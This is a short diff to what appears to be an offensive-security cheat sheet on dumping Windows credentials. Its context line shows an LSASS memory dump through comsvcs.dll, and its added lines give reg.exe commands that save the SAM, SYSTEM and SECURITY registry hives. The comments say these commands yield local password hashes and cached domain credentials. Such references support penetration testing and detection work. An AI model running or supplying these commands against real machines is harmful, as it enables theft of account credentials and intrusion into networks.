@@ -966,7 +966,12 @@ PS C:\> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
 - Reg
 
 ```
+## If only want to dump the hashes of local users
 C:\> reg.exe save hklm\sam C:\sam.save
+C:\> reg.exe save hklm\system C:\system.save
+
+# If we want cached domain user credentials
+C:\> reg.exe save hklm\security C:\security.save
 ```
 
 - Vssadmin
